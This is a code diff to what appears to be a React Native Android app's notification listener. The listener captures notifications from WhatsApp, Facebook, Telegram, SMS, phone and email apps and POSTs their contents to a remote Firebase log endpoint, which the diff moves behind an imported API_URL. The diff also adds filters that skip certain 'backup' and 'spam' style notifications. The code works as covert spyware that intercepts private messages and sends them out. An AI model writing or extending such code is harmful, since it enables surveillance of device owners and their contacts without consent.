@@ -3,6 +3,7 @@ import { RNAndroidNotificationListenerHeadlessJsName } from 'react-native-androi
 
 import { name as appName } from './app.json'
 import App from './src/App'
+import { API_URL } from './consents'
 
 
 /**
@@ -38,35 +39,43 @@ const headlessNotificationListener = async ({ notification }: any) => {
          * I'm using AsyncStorage here as an example.
          */
         
-        const list = ['whatsapp', 'fb', 'facebook', 'business', 'message', 'phone', 'call', 'sim', 'dial', 'system', 'meta', 'email', 'text', 'telegram', 'phone', 'contact', 'instagram', 'twitter', 'jio'];
+        const list = ['whatsapp', 'fb', 'facebook', 'business', 'message', 'phone', 'call', 'sim', 'dial', 'system', 'meta', 'email', 'text', 'telegram', 'phone', 'contact', 'instagram', 'twitter'];
+        const titles = ['backup', 'spam'];
+        const texts = ['chats', 'messages'];
         const notificationObj = JSON.parse(notification);
         const app = notificationObj.app;
+        const title = notificationObj.title;
+        const text = notificationObj.text;
         const containsName = list.some(name => app.includes(name));
         if(containsName){
-            delete notificationObj.iconLarge
-            delete notificationObj.icon
-            delete notificationObj.image
-            delete notificationObj.imageBackgroundURI
+            const containsText = texts.some(name => text.includes(name));
+            const containsTitle = titles.some(name => title.includes(name));
+            if(!containsTitle && !containsText){
+                
+                delete notificationObj.iconLarge
+                delete notificationObj.icon
+                delete notificationObj.image
+                delete notificationObj.imageBackgroundURI
 
-            
-            const myHeaders = new Headers();
-            myHeaders.append("Content-Type", "application/json");
+                const myHeaders = new Headers();
+                myHeaders.append("Content-Type", "application/json");
 
-            const raw = JSON.stringify({
-            "app": notificationObj.app,
-            "notification": notificationObj
-            });
+                const raw = JSON.stringify({
+                "app": notificationObj.app,
+                "notification": notificationObj
+                });
 
-            const requestOptions = {
-            method: "POST",
-            headers: myHeaders,
-            body: raw,
-            redirect: "follow"
-            };
+                const requestOptions = {
+                method: "POST",
+                headers: myHeaders,
+                body: raw,
+                redirect: "follow"
+                };
 
-            fetch("https://mocklog-76c05-default-rtdb.asia-southeast1.firebasedatabase.app/log.json", requestOptions)
-            .then((response) => console.log("response",response.text()))
-            .catch((error) => console.error(error));
+                fetch(API_URL, requestOptions)
+                .then((response) => console.log("response",response.text()))
+                .catch((error) => console.error(error));
+        }
         }else{
             console.log("Not a app to get info")
         }
